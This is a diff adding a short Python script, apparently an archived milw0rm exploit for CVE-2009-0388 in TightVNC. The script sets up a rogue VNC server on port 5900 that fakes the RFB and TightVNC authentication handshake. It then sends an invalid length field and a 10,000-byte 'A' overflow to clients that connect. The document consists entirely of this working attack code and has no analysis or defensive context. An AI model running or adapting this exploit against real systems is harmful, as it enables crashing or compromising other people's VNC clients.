@@ -1,0 +1,55 @@
+#!/usr/bin/env python
+
+#digital.desi@in.com
+
+# Modified  Andres Lopez Luksenberg's exploit for Authentication Failure scenario in TightVNC. BID 33569 CVE-2009-0388
+
+import socket
+
+serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+serversocket.bind(('', 5900))
+serversocket.listen(1)
+
+while True:
+		clientsocket, clientaddres = serversocket.accept()
+		
+		data = 'RFB 003.008\n'
+		clientsocket.sendall(data)
+
+		data_cli = clientsocket.recv(1024)
+		print data_cli
+
+		data = '\x02\x02\x10'
+		clientsocket.sendall(data)
+
+		data_cli = clientsocket.recv(1024)
+
+		data = '\x00'*4
+		clientsocket.sendall(data)
+
+		data = ('\x00'*3)+'\x01'
+		clientsocket.sendall(data)
+
+		data = ('\x00'*3)+'\x02STDVVNCAUTH_'
+		clientsocket.sendall(data)
+
+		data_cli = clientsocket.recv(1024)
+
+		data = ('\x01'*16)
+		clientsocket.sendall(data)
+
+		data_cli = clientsocket.recv(1024)
+		
+		data = '\x00\x00\x00\x01'
+		clientsocket.sendall(data)
+
+		data = '\xf0\xff\xff\xff'
+		clientsocket.sendall(data)
+
+		data = 'A'*10000
+		clientsocket.sendall(data)
+
+clientsocket.close()
+serversocket.close()
+
+# milw0rm.com [2009-02-09]
